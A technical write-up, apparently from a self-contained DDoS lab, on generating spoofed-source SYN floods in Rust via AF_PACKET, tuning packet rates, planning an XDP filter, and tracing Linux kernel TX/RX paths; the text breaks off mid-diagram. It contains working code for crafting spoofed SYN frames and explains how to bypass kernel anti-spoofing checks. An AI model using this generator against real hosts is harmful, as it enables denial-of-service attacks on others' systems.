# Packet Generation Deep Dive

A technical exploration of raw packet generation in Linux, from our journey building a DDoS traffic generator.

## Table of Contents

1. [The Problem](#the-problem)
2. [Approach 1: Raw IP Sockets (Failed)](#approach-1-raw-ip-sockets)
3. [Approach 2: AF_PACKET (Success)](#approach-2-af_packet)
4. [Ethernet Frame Anatomy](#ethernet-frame-anatomy)
5. [The Macvlan Hairpin](#the-macvlan-hairpin)
6. [Performance Tuning](#performance-tuning)
7. [Relationship to XDP/eBPF](#relationship-to-xdpebpf)
8. [Code Walkthrough](#code-walkthrough)

---

## The Problem

We needed to generate DDoS attack traffic with:
- **Spoofed source IPs** (10.0.0.0/8 range)
- **High packet rates** (10k-100k+ pps)
- **Hairpin routing** back to a container on the same host
- **API control** for starting/stopping attacks

The challenge: Linux's network stack actively prevents IP spoofing for good reason.

---

## Approach 1: Raw IP Sockets

### The Attempt

```rust
// Create raw IP socket
let fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

// Enable IP_HDRINCL to craft our own IP headers
setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &1);

// Bind to specific interface
setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, "eno1");

// Craft packet with spoofed source IP
let packet = craft_ip_packet(
    src: "10.1.2.3",      // Spoofed!
    dst: "192.168.1.200",
    ...
);

// Send it
sendto(fd, &packet, ...);
```

### Why It Failed

The `sendto()` returned success, but packets never appeared on the wire!

**Root cause:** Even with `IP_HDRINCL` and `SO_BINDTODEVICE`, the kernel still performs routing decisions. When the source IP (10.x.x.x) doesn't match any local interface, the kernel may:

1. Apply reverse path filtering (rp_filter) - we disabled this
2. Fail ARP resolution for the "source" - not applicable for outbound
3. **Silently drop in the routing subsystem** - this was our issue

The kernel's routing code expects source IPs to be "ours" even when we're crafting headers manually. While the packet is accepted by the socket layer, it gets dropped before transmission.

### Debugging Tools Used

```bash
# Check if packets leave the interface
sudo tcpdump -i eno1 -n 'src net 10.0.0.0/8'

# Check rp_filter (we disabled it)
sysctl net.ipv4.conf.all.rp_filter

# Check iptables - nothing blocking
sudo iptables -L OUTPUT -n -v
```

---

## Approach 2: AF_PACKET

### The Solution

`AF_PACKET` provides **layer 2 (Ethernet) access**, completely bypassing the kernel's IP routing stack.

```rust
// Create packet socket - layer 2 access
let fd = socket(
    AF_PACKET,           // Packet socket family
    SOCK_RAW,            // Raw access
    ETH_P_IP.to_be(),    // We're sending IP packets
);

// Bind to specific interface
let sll = sockaddr_ll {
    sll_family: AF_PACKET,
    sll_protocol: ETH_P_IP.to_be(),
    sll_ifindex: get_ifindex("macv1"),
    sll_halen: 6,
    sll_addr: dst_mac,  // Destination MAC address
    ...
};
bind(fd, &sll, ...);

// Craft FULL Ethernet frame (not just IP packet)
let frame = craft_ethernet_frame(
    dst_mac: "aa:ee:10:e4:73:cc",  // Container's MAC
    src_mac: "c2:2e:3a:db:dd:fa",  // Our interface's MAC
    ethertype: 0x0800,             // IPv4
    payload: craft_ip_packet(
        src: "10.1.2.3",           // Spoofed - kernel doesn't care!
        dst: "192.168.1.200",
        ...
    ),
);

// Send it
sendto(fd, &frame, &sll, ...);
```

### Why It Works

With `AF_PACKET`:

1. **We provide the Ethernet header** - the kernel doesn't need to do ARP
2. **We specify the destination MAC** - no routing decisions needed
3. **We bypass the IP layer entirely** - source IP validation doesn't apply
4. **The NIC just transmits what we give it** - it's just bytes on the wire

The kernel's only job is to hand our frame to the network driver. No routing, no filtering, no validation.

---

## Ethernet Frame Anatomy

Here's what we're crafting:

```
┌─────────────────────────────────────────────────────────────────┐
│                        ETHERNET FRAME                           │
├──────────────┬──────────────┬───────────┬───────────────────────┤
│  Dst MAC     │  Src MAC     │ EtherType │       Payload         │
│  (6 bytes)   │  (6 bytes)   │ (2 bytes) │    (46-1500 bytes)    │
├──────────────┴──────────────┴───────────┴───────────────────────┤
│                                                                 │
│  aa:ee:10:    c2:2e:3a:      08:00       [IP PACKET...]         │
│  e4:73:cc     db:dd:fa       (IPv4)                             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

                              │
                              ▼

┌─────────────────────────────────────────────────────────────────┐
│                          IP PACKET                              │
├────────┬─────┬─────┬────────┬────────┬──────────┬───────────────┤
│ Ver/IHL│ TOS │ Len │  ID    │ Flags  │   TTL    │   Protocol    │
│(1 byte)│(1)  │(2)  │ (2)    │ (2)    │  (1)     │    (1)        │
├────────┴─────┴─────┴────────┴────────┴──────────┴───────────────┤
│ Header Checksum (2) │ Source IP (4)    │ Dest IP (4)            │
├─────────────────────┴──────────────────┴────────────────────────┤
│                          TCP/UDP/ICMP...                        │
└─────────────────────────────────────────────────────────────────┘

│  0x45  │ 0x00│  40 │ random │ 0x4000 │   64   │   6 (TCP)     │
│        │     │     │        │  (DF)  │        │               │
├────────┴─────┴─────┴────────┴────────┴────────┴───────────────┤
│    checksum    │   10.1.2.3 (SPOOFED!)  │  192.168.1.200      │
└─────────────────────────────────────────────────────────────────┘
```

### Key Fields for Spoofing

| Field | Offset | What We Set |
|-------|--------|-------------|
| Dst MAC | 0-5 | Target's real MAC (from ARP cache) |
| Src MAC | 6-11 | Our interface's MAC (must be valid) |
| EtherType | 12-13 | 0x0800 (IPv4) |
| IP Src | 26-29 | **SPOOFED** (10.x.x.x) |
| IP Dst | 30-33 | Target IP (192.168.1.200) |

The Ethernet layer is honest (real MACs), but the IP layer lies (fake source).

---

## The Macvlan Hairpin

### The Topology Challenge

```
                    ┌─────────────────────────────────┐
                    │           HOST                  │
                    │                                 │
                    │  ┌───────────┐  ┌────────────┐ │
                    │  │ Generator │  │  Nginx     │ │
                    │  │ (sends    │  │  Container │ │
                    │  │  attack)  │  │  (target)  │ │
                    │  └─────┬─────┘  └──────┬─────┘ │
                    │        │               │       │
                    │        │ macv1         │ macvlan│
                    │        │               │ (eth1) │
                    │        └───────┬───────┘       │
                    │                │               │
                    │             eno1               │
                    │           (parent)             │
                    └────────────────┼───────────────┘
                                     │
                              ┌──────┴──────┐
                              │   SWITCH    │
                              └─────────────┘
```

### Why eno1 Didn't Work

When we sent from `eno1`:
1. Packet goes to switch with dst MAC = container's MAC
2. Switch sees: "Dst MAC is on the same port as src"
3. Switch doesn't need to forward - it's the same port!
4. Packet never hairpins back

### Why macv1 Works

Macvlan creates virtual interfaces that appear as **separate MAC addresses** on the same physical NIC. The Linux kernel's macvlan driver handles inter-macvlan communication:

```
macv1 (192.168.1.131, MAC: c2:2e:3a:db:dd:fa)
   │
   │  "Send to aa:ee:10:e4:73:cc"
   ▼
macvlan driver
   │
   │  "That MAC belongs to another macvlan on same parent"
   │  "I'll deliver it internally"
   ▼
container's eth1 (192.168.1.200, MAC: aa:ee:10:e4:73:cc)
```

The macvlan driver acts as a **virtual switch**, forwarding between macvlan interfaces on the same parent without going to the physical network.

### ARP Cache Importance

We get the container's MAC from the ARP cache:

```bash
$ cat /proc/net/arp | grep 192.168.1.200
192.168.1.200    0x1    0x2    aa:ee:10:e4:73:cc    *    macv21
```

Note: The ARP entry is on `macv21`, not `eno1`. The host's `eno1` can't ARP the container because:
- Macvlan isolation: containers and host can't directly communicate via macvlan
- Only other macvlan interfaces can reach the container

Our code handles this by searching all ARP entries and skipping incomplete ones (00:00:00:00:00:00).

---

## Performance Tuning

### The Batching Problem

Initial attempt with per-packet sleep:

```rust
// Target: 10,000 pps = 100μs between packets
loop {
    send_packet();
    tokio::time::sleep(Duration::from_micros(100)).await;
}
// Actual: ~780 pps 😢
```

Tokio's timer has ~1ms practical resolution. Each "100μs" sleep actually takes 1-2ms.

### The Solution: Batch Sending

```rust
// Send 10 packets, then sleep 1ms
// Target: 10,000 pps = 10 packets × 1000 batches/sec
let batch_size = pps / 1000;  // 10 for 10k pps
loop {
    for _ in 0..batch_size {
        send_packet();
    }
    tokio::time::sleep(Duration::from_millis(1)).await;
}
// Actual: ~4,400 pps (closer!)
```

### Further Optimization Ideas

1. **Busy-wait for sub-ms timing:**
   ```rust
   let start = Instant::now();
   while start.elapsed() < target_interval {
       std::hint::spin_loop();
   }
   ```

2. **Kernel bypass with AF_XDP:**
   - Zero-copy packet transmission
   - Eliminates syscall overhead
   - Can achieve millions of pps

3. **DPDK:**
   - Complete userspace networking
   - Polls NIC directly
   - Used in production load generators

4. **Multi-threading:**
   - Spawn multiple sender threads
   - Each handles a portion of target PPS

---

## Relationship to XDP/eBPF

### What We Built (Userspace)

```
┌─────────────────────────────────────────────────────────────────┐
│                        USERSPACE                                │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │                  Our Rust Generator                      │   │
│  │                                                         │   │
│  │  1. Craft Ethernet frame with spoofed IP               │   │
│  │  2. syscall: sendto(AF_PACKET, frame)                  │   │
│  │                                                         │   │
│  └─────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
                              │
                    ══════════╪══════════ syscall boundary
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                         KERNEL                                  │
│                                                                 │
│  packet socket → driver tx queue → NIC                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### What XDP Does (Kernel)

```
┌─────────────────────────────────────────────────────────────────┐
│                         KERNEL                                  │
│                                                                 │
│  NIC → driver rx → ┌──────────────┐ → network stack            │
│                    │  XDP PROGRAM │                             │
│                    │              │                             │
│                    │  if src in   │                             │
│                    │  10.0.0.0/8: │                             │
│                    │    XDP_DROP  │ ← Packet never reaches      │
│                    │  else:       │   TCP/IP stack!             │
│                    │    XDP_PASS  │                             │
│                    └──────────────┘                             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### XDP Hook Points

```
     Packet arrives
          │
          ▼
    ┌───────────┐
    │    NIC    │
    └─────┬─────┘
          │
          ▼
    ┌───────────┐     ← XDP_NATIVE: Runs in driver (fastest)
    │  Driver   │
    └─────┬─────┘
          │
          ▼
    ┌───────────┐     ← XDP_GENERIC/SKB: Runs after skb allocation
    │   skb     │
    │ allocation│
    └─────┬─────┘
          │
          ▼
    ┌───────────┐
    │  TC/BPF   │     ← tc-bpf: Traffic control hook
    └─────┬─────┘
          │
          ▼
    ┌───────────┐
    │ netfilter │     ← iptables/nftables (slowest)
    └─────┬─────┘
          │
          ▼
    ┌───────────┐
    │  TCP/IP   │
    │   stack   │
    └───────────┘
```

XDP is the **earliest possible hook** - before memory is even allocated for the packet. This is why it's so efficient for DDoS mitigation.

### Our Planned XDP Filter

```c
// xdp-filter-ebpf/src/main.rs (eBPF code in Rust!)

#[xdp]
pub fn xdp_filter(ctx: XdpContext) -> u32 {
    // Parse Ethernet header
    let eth = ptr_at::<EthHdr>(&ctx, 0)?;
    
    // Only process IPv4
    if eth.ether_type != ETH_P_IP {
        return XDP_PASS;
    }
    
    // Parse IP header
    let ip = ptr_at::<IpHdr>(&ctx, ETH_HDR_LEN)?;
    
    // Check if source is in attack range (10.0.0.0/8)
    let src_ip = u32::from_be(ip.src_addr);
    if (src_ip & 0xFF000000) == 0x0A000000 {
        // Attack traffic - DROP before it reaches TCP stack
        update_stats(DROPPED);
        return XDP_DROP;
    }
    
    // Legitimate traffic - let it through
    update_stats(PASSED);
    XDP_PASS
}
```

### AF_XDP: Best of Both Worlds

For our generator, we could use AF_XDP instead of AF_PACKET:

```
┌─────────────────────────────────────────────────────────────────┐
│                        USERSPACE                                │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │                  AF_XDP Generator                        │   │
│  │                                                         │   │
│  │  1. Write frame to UMEM (shared memory)                │   │
│  │  2. Update TX ring (just a pointer!)                   │   │
│  │  3. No syscall needed for each packet                  │   │
│  │                                                         │   │
│  └─────────────────────────────────────────────────────────┘   │
└────────────────────────────────────────────────────────┬────────┘
                              │                          │
                    ══════════╪══════════ shared memory  │
                              │                          │
                              ▼                          │
┌─────────────────────────────────────────────────────────────────┐
│                         KERNEL                                  │
│                                                                 │
│  XDP program → redirect to AF_XDP socket                       │
│      │                                                         │
│      └── or: TX directly from UMEM to NIC                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

This could get us to millions of pps from userspace.

---

## Code Walkthrough

### Key Files

```
ddos-lab/
├── xdp-generator/src/lib.rs    # Packet generation (this doc's focus)
├── xdp-filter/src/lib.rs       # XDP loader (stubbed)
├── xdp-filter-ebpf/src/main.rs # eBPF program (pending toolchain fix)
└── control-plane/src/main.rs   # HTTP API
```

### Packet Generation Flow

```rust
// 1. Create AF_PACKET socket
let fd = socket(AF_PACKET, SOCK_RAW, ETH_P_IP.to_be());

// 2. Get interface details
let ifindex = get_ifindex("macv1");
let src_mac = get_mac("macv1");
let dst_mac = get_gateway_mac(target_ip);  // From ARP cache

// 3. Bind to interface
bind(fd, &sockaddr_ll { 
    sll_ifindex: ifindex,
    sll_addr: dst_mac,
    ...
});

// 4. Main loop
while running {
    // Generate random spoofed source IP
    let src_ip = Ipv4Addr::new(10, rand(), rand(), rand());
    
    // Craft full Ethernet frame
    let frame = craft_eth_syn_packet(
        &src_mac, &dst_mac,
        src_ip, target_ip,
        rand_port(), 443,
    );
    
    // Send it
    sendto(fd, &frame, &sll);
}
```

### Frame Crafting Detail

```rust
fn craft_eth_syn_packet(...) -> Vec<u8> {
    let mut pkt = vec![0u8; 14 + 20 + 20];  // Eth + IP + TCP
    
    // === ETHERNET HEADER (14 bytes) ===
    pkt[0..6].copy_from_slice(dst_mac);     // Destination MAC
    pkt[6..12].copy_from_slice(src_mac);    // Source MAC
    pkt[12..14].copy_from_slice(&0x0800u16.to_be_bytes());  // IPv4
    
    // === IP HEADER (20 bytes) ===
    pkt[14] = 0x45;  // Version 4, IHL 5 (20 bytes)
    pkt[15] = 0x00;  // DSCP/ECN
    pkt[16..18].copy_from_slice(&40u16.to_be_bytes());  // Total length
    pkt[18..20].copy_from_slice(&rand_id.to_be_bytes()); // ID
    pkt[20] = 0x40;  // Flags: Don't Fragment
    pkt[21] = 0x00;  // Fragment offset
    pkt[22] = 64;    // TTL
    pkt[23] = 6;     // Protocol: TCP
    // [24..26] = checksum (calculated below)
    pkt[26..30].copy_from_slice(&src_ip.octets());  // SOURCE (SPOOFED!)
    pkt[30..34].copy_from_slice(&dst_ip.octets());  // Destination
    
    // Calculate IP checksum
    let csum = ip_checksum(&pkt[14..34]);
    pkt[24..26].copy_from_slice(&csum.to_be_bytes());
    
    // === TCP HEADER (20 bytes) ===
    pkt[34..36].copy_from_slice(&src_port.to_be_bytes());
    pkt[36..38].copy_from_slice(&dst_port.to_be_bytes());
    pkt[38..42].copy_from_slice(&rand_seq.to_be_bytes());  // Sequence
    pkt[42..46].copy_from_slice(&0u32.to_be_bytes());      // Ack
    pkt[46] = 0x50;  // Data offset: 5 (20 bytes)
    pkt[47] = 0x02;  // Flags: SYN
    pkt[48..50].copy_from_slice(&65535u16.to_be_bytes()); // Window
    // [50..52] = TCP checksum (with pseudo-header)
    
    pkt
}
```

---

## Summary

| Aspect | Raw IP Socket | AF_PACKET |
|--------|---------------|-----------|
| Layer | 3 (IP) | 2 (Ethernet) |
| Header | IP + TCP/UDP | Ethernet + IP + TCP/UDP |
| Kernel routing | Yes (fails with spoofed src) | No (bypassed) |
| Requires MAC | No | Yes |
| Spoofing | Blocked | Works ✓ |
| Performance | N/A | ~4-10k pps (batched) |

**Key Learnings:**

1. The kernel protects against IP spoofing at multiple layers
2. AF_PACKET bypasses IP-layer checks by working at Ethernet level
3. Macvlan enables hairpin routing between virtual interfaces
4. Batching is essential for high PPS with async runtimes
5. XDP/eBPF will let us filter these packets at the earliest point possible

---

## The Kernel TX Path: From sendto() to Wire

This section dives deep into what happens when we call `sendto()` on an AF_PACKET socket - every layer the packet traverses before photons leave the NIC.

### Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              USERSPACE                                      │
│                                                                             │
│   our_generator.rs                                                          │
│         │                                                                   │
│         │  sendto(fd, &frame, 0, &sockaddr_ll, sizeof(sockaddr_ll))        │
│         ▼                                                                   │
└─────────────────────────────────────────────────────────────────────────────┘
          │
          │  ════════════════════════════════════════════════════════════
          │                      SYSCALL BOUNDARY
          │  ════════════════════════════════════════════════════════════
          ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                               KERNEL                                        │
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ 1. SYSCALL ENTRY (arch/x86/entry/common.c)                          │   │
│  │    - Save registers, switch to kernel stack                        │   │
│  │    - Look up syscall handler: sys_sendto                           │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                              │                                              │
│                              ▼                                              │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ 2. SOCKET LAYER (net/socket.c)                                      │   │
│  │    - Validate fd → struct socket                                   │   │
│  │    - copy_from_user() the packet data                              │   │
│  │    - Call protocol-specific sendmsg: packet_sendmsg()              │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                              │                                              │
│                              ▼                                              │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ 3. PACKET SOCKET (net/packet/af_packet.c)                           │   │
│  │    - Allocate sk_buff (skb) from slab allocator                    │   │
│  │    - Copy frame data into skb->data                                │   │
│  │    - Set skb->dev = target interface (macv1)                       │   │
│  │    - Call dev_queue_xmit(skb)                                      │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                              │                                              │
│                              ▼                                              │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ 4. TRAFFIC CONTROL / QDISC (net/sched/sch_*.c)                      │   │
│  │    - Packet enters queueing discipline (default: pfifo_fast)       │   │
│  │    - May be queued, shaped, or passed through                      │   │
│  │    - Calls dev_hard_start_xmit() when ready                        │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                              │                                              │
│                              ▼                                              │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ 5. NETWORK DEVICE (net/core/dev.c)                                  │   │
│  │    - Select TX queue (multi-queue NICs have many)                  │   │
│  │    - Call driver's ndo_start_xmit()                                │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                              │                                              │
│                              ▼                                              │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │ 6. DEVICE DRIVER (drivers/net/ethernet/intel/e1000e/netdev.c)       │   │
│  │    - Map skb data for DMA: dma_map_single()                        │   │
│  │    - Write TX descriptor to ring buffer                            │   │
│  │    - Update tail pointer register (MMIO write)                     │   │
│  │    - NIC sees new descriptor and reads packet via DMA              │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                              │                                              │
└──────────────────────────────┼──────────────────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                               NIC HARDWARE                                  │
│                                                                             │
│  TX Ring        TX DMA Engine       MAC                    PHY              │
│  ┌──────┐       ┌──────────┐     ┌──────┐              ┌──────┐            │
│  │desc 0│──────▶│ Read pkt │────▶│Frame │─────────────▶│ Wire │ ─ ─ ─ ▶    │
│  │desc 1│       │ from RAM │     │ CRC  │              │ PHY  │  photons   │
│  │desc 2│       └──────────┘     └──────┘              └──────┘            │
│  │ ...  │                                                                   │
│  └──────┘                                                                   │
│     ▲                                                                       │
│     └─── Tail pointer updated by driver                                     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Step 1: The Syscall Entry

When we call `sendto()` from Rust/C:

```rust
// Our code
libc::sendto(fd, frame.as_ptr() as *const _, frame.len(), 0, 
             &sll as *const _ as *const libc::sockaddr, 
             std::mem::size_of::<libc::sockaddr_ll>() as u32);
```

The CPU transitions from user mode to kernel mode:

```
User Mode (Ring 3)                    Kernel Mode (Ring 0)
────────────────────                  ────────────────────
                     SYSCALL instruction
   sendto() ─────────────────────────────▶ entry_SYSCALL_64
                                              │
                     Saves:                   │
                     - User RSP → kernel stack
                     - User RIP → pt_regs
                     - RFLAGS saved           │
                                              ▼
                                         sys_sendto()
```

**Cost:** ~100-200 CPU cycles for the mode switch. This is why AF_XDP (which can avoid syscalls) is so much faster.

### Step 2: Socket Layer Processing

```c
// net/socket.c - simplified
SYSCALL_DEFINE6(sendto, int, fd, void __user *, buff, size_t, len,
                unsigned int, flags, struct sockaddr __user *, addr, ...)
{
    struct socket *sock;
    struct msghdr msg;
    struct iovec iov;
    
    // Find socket from file descriptor
    sock = sockfd_lookup(fd, &err);  // fd → struct socket
    
    // Set up message structure
    iov.iov_base = buff;
    iov.iov_len = len;
    msg.msg_iter = &iov;
    msg.msg_name = addr;
    
    // Call protocol-specific send
    // For AF_PACKET: packet_sendmsg()
    return sock_sendmsg(sock, &msg);
}
```

**Key operation:** `copy_from_user()` - the kernel copies our packet from userspace memory into kernel memory. This is one of the main overhead sources.

### Step 3: AF_PACKET Processing

```c
// net/packet/af_packet.c - simplified
static int packet_sendmsg(struct socket *sock, struct msghdr *msg, size_t len)
{
    struct sock *sk = sock->sk;
    struct net_device *dev;
    struct sk_buff *skb;
    
    // Get target device from sockaddr_ll
    dev = dev_get_by_index(sock_net(sk), sll->sll_ifindex);
    
    // Allocate socket buffer (skb)
    // This is the kernel's packet representation
    skb = sock_alloc_send_skb(sk, len + dev->hard_header_len, ...);
    
    // Reserve space for headers, copy user data
    skb_reserve(skb, dev->hard_header_len);
    memcpy_from_msg(skb_put(skb, len), msg, len);
    
    // Set metadata
    skb->dev = dev;
    skb->protocol = sll->sll_protocol;  // ETH_P_IP
    
    // Send it!
    return dev_queue_xmit(skb);
}
```

### The sk_buff (skb) - Linux's Packet Representation

The `sk_buff` is the central data structure for network packets in Linux:

```
┌────────────────────────────────────────────────────────────────────────────┐
│                           struct sk_buff                                   │
├────────────────────────────────────────────────────────────────────────────┤
│                                                                            │
│  Metadata (lives in skb struct):                                          │
│  ┌──────────────────────────────────────────────────────────────────────┐ │
│  │ *dev          → network device (macv1)                               │ │
│  │ protocol      → ETH_P_IP (0x0800)                                    │ │
│  │ len           → total packet length                                  │ │
│  │ *head         → start of allocated buffer                            │ │
│  │ *data         → start of current data (moves as headers processed)  │ │
│  │ *tail         → end of current data                                  │ │
│  │ *end          → end of allocated buffer                              │ │
│  │ queue_mapping → which TX queue to use                                │ │
│  │ tstamp        → timestamp                                            │ │
│  │ *destructor   → callback when freed                                  │ │
│  └──────────────────────────────────────────────────────────────────────┘ │
│                                                                            │
│  Packet Data (separate allocation):                                       │
│  ┌──────────────────────────────────────────────────────────────────────┐ │
│  │    head            data                              tail        end │ │
│  │      │               │                                 │           │ │ │
│  │      ▼               ▼                                 ▼           ▼ │ │
│  │      ┌───────────────┬─────────────────────────────────┬───────────┐ │ │
│  │      │  (headroom)   │  ETHERNET + IP + TCP + payload  │ (tailroom)│ │ │
│  │      │  14 bytes     │       54+ bytes                 │           │ │ │
│  │      └───────────────┴─────────────────────────────────┴───────────┘ │ │
│  │                                                                      │ │
│  │      ◀──── skb_headroom() ────▶◀──────── skb->len ────────▶         │ │
│  └──────────────────────────────────────────────────────────────────────┘ │
│                                                                            │
└────────────────────────────────────────────────────────────────────────────┘
```

**Key insight:** The `data` pointer moves as headers are added/removed. When receiving, it moves forward as each layer strips headers. For TX, we provide the complete frame.

### Step 4: Traffic Control (Qdisc)

Before hitting the driver, packets go through the queueing discipline:

```c
// net/core/dev.c
int dev_queue_xmit(struct sk_buff *skb)
{
    struct netdev_queue *txq;
    struct Qdisc *q;
    
    // Select TX queue (important for multi-queue NICs)
    txq = netdev_pick_tx(dev, skb);
    q = txq->qdisc;
    
    // Enqueue to qdisc
    if (q->enqueue) {
        // Qdisc may queue, shape, or rate-limit
        q->enqueue(skb, q);
        __qdisc_run(q);  // Try to dequeue and transmit
    } else {
        // No qdisc (rare) - direct transmit
        dev_hard_start_xmit(skb, dev, txq);
    }
}
```

**Common qdiscs:**

| Qdisc | Description |
|-------|-------------|
| `pfifo_fast` | Default. 3 priority bands, FIFO within each |
| `fq_codel` | Fair queuing + controlled delay. Modern default |
| `htb` | Hierarchical token bucket. Rate limiting |
| `noqueue` | No queueing. Used by loopback, virtual interfaces |

For high-speed packet generation, `noqueue` or `pfifo_fast` adds minimal overhead.

```bash
# Check qdisc on an interface
tc qdisc show dev macv1

# Set noqueue for minimal overhead
sudo tc qdisc replace dev macv1 root noqueue
```

### Step 5: Driver TX Submission

The driver's `ndo_start_xmit` function is called:

```c
// Example: Intel e1000e driver (simplified)
// drivers/net/ethernet/intel/e1000e/netdev.c

static netdev_tx_t e1000_xmit_frame(struct sk_buff *skb, 
                                     struct net_device *netdev)
{
    struct e1000_adapter *adapter = netdev_priv(netdev);
    struct e1000_ring *tx_ring = adapter->tx_ring;
    struct e1000_tx_desc *tx_desc;
    dma_addr_t dma;
    
    // Get next available TX descriptor
    int i = tx_ring->next_to_use;
    tx_desc = E1000_TX_DESC(*tx_ring, i);
    
    // Map packet data for DMA
    // CPU writes to RAM, NIC reads from RAM - need to sync
    dma = dma_map_single(&adapter->pdev->dev, 
                         skb->data, skb->len,
                         DMA_TO_DEVICE);
    
    // Fill in TX descriptor
    tx_desc->buffer_addr = cpu_to_le64(dma);
    tx_desc->cmd_type_len = cpu_to_le32(skb->len | E1000_TXD_CMD_EOP);
    
    // Save skb for later cleanup
    tx_ring->buffer_info[i].skb = skb;
    tx_ring->buffer_info[i].dma = dma;
    
    // Advance ring pointer
    tx_ring->next_to_use = (i + 1) % tx_ring->count;
    
    // CRITICAL: Write tail register - tells NIC there's work to do
    writel(tx_ring->next_to_use, tx_ring->tail);
    
    return NETDEV_TX_OK;
}
```

### The TX Ring Buffer

NICs use ring buffers (circular queues) for TX and RX:

```
                        TX RING BUFFER
                    (array of descriptors)
                    
         head (NIC)                    tail (driver)
            │                              │
            ▼                              ▼
     ┌──────┬──────┬──────┬──────┬──────┬──────┬──────┬──────┐
     │sent ✓│sent ✓│ busy │ busy │ready │ready │empty │empty │
     │      │      │  DMA │  DMA │      │      │      │      │
     └──────┴──────┴──────┴──────┴──────┴──────┴──────┴──────┘
        0      1      2      3      4      5      6      7
                       │      │
                       └──────┘
                     NIC is DMAing
                     these packets
                     
     Legend:
     - head: Last descriptor NIC finished (updated by NIC)
     - tail: Last descriptor driver queued (updated by driver)
     - sent ✓: Complete, can free skb
     - busy: NIC currently transmitting
     - ready: Waiting for NIC
     - empty: Available for new packets
```

**Producer-consumer model:**
- **Driver (producer):** Writes descriptors, advances tail
- **NIC (consumer):** Reads descriptors, advances head

### TX Descriptor Format

Each descriptor tells the NIC where to find packet data:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    TX DESCRIPTOR (16 bytes typical)                    │
├─────────────────────────────────────────────────────────────────────────┤
│  Buffer Address (8 bytes)    │  Command/Status (4 bytes) │ Length (2)  │
│  Physical DMA address of     │  EOP: End of packet       │ Packet size │
│  packet data in RAM          │  RS: Report status        │             │
│                              │  IC: Insert checksum      │             │
│  0x00007f8a_12340000         │  0x0b000000               │ 0x0036      │
└─────────────────────────────────────────────────────────────────────────┘
```

### DMA: The Zero-Copy Transfer

DMA (Direct Memory Access) allows the NIC to read packet data from RAM without CPU involvement:

```
                CPU writes          NIC reads via DMA
                descriptor          packet data
                    │                    │
                    ▼                    ▼
     ┌────────────────────────────────────────────────────────────┐
     │                         RAM                                │
     │                                                            │
     │   TX Descriptor Ring         Packet Data Buffer           │
     │   ┌─────────────────┐       ┌──────────────────────────┐  │
     │   │ addr: 0x7f8a... │ ─────▶│ dst MAC | src MAC | 0800 │  │
     │   │ len: 54         │       │ 45 00 00 36 ... IP hdr   │  │
     │   │ cmd: EOP|RS     │       │ TCP header + payload     │  │
     │   └─────────────────┘       └──────────────────────────┘  │
     │          ▲                            ▲                   │
     └──────────┼────────────────────────────┼───────────────────┘
                │                            │
     ┌──────────┴────────────────────────────┴───────────────────┐
     │                    PCIe BUS                               │
     └──────────┬────────────────────────────┬───────────────────┘
                │                            │
                ▼                            │
     ┌───────────────────────────────────────┴───────────────────┐
     │                         NIC                               │
     │                                                           │
     │   1. Sees new descriptor (tail > head)                   │
     │   2. DMA reads packet data from RAM                      │
     │   3. Adds FCS (frame check sequence)                     │
     │   4. Transmits on wire                                   │
     │   5. Writes completion status to descriptor              │
     │   6. Advances head pointer                               │
     │   7. Optionally raises interrupt                         │
     │                                                           │
     └───────────────────────────────────────────────────────────┘
```

### TX Completion and Cleanup

After transmission, the driver must clean up:

```c
// TX completion interrupt or polling
static void e1000_clean_tx_ring(struct e1000_ring *tx_ring)
{
    struct e1000_tx_desc *tx_desc;
    int i = tx_ring->next_to_clean;
    
    // Process completed descriptors (head moved by NIC)
    while (i != tx_ring->next_to_use) {
        tx_desc = E1000_TX_DESC(*tx_ring, i);
        
        // Check if NIC finished with this descriptor
        if (!(tx_desc->status & E1000_TXD_STAT_DD))
            break;  // Not done yet
        
        // Unmap DMA
        dma_unmap_single(&adapter->pdev->dev,
                         tx_ring->buffer_info[i].dma,
                         tx_ring->buffer_info[i].length,
                         DMA_TO_DEVICE);
        
        // Free the skb
        dev_kfree_skb(tx_ring->buffer_info[i].skb);
        
        i = (i + 1) % tx_ring->count;
    }
    
    tx_ring->next_to_clean = i;
}
```

---

## The Kernel RX Path: From Wire to XDP Drop

Now let's trace the receive path, showing where XDP intercepts:

```
     ─ ─ ─ ▶  photons arrive
              │
              ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                               NIC HARDWARE                                  │
│                                                                             │
│   PHY                  MAC                  RX DMA Engine      RX Ring      │
│  ┌──────┐           ┌──────┐              ┌──────────────┐    ┌──────┐     │
│  │ Wire │──────────▶│Frame │─────────────▶│ Write packet │───▶│desc 0│     │
│  │ PHY  │           │ Check│              │  to RAM      │    │desc 1│     │
│  └──────┘           │ FCS  │              └──────────────┘    │ ...  │     │
│                     └──────┘                                  └──────┘     │
│                         │                                         │        │
│                         │ Good FCS?                              │        │
│                         │    ▼                                   ▼        │
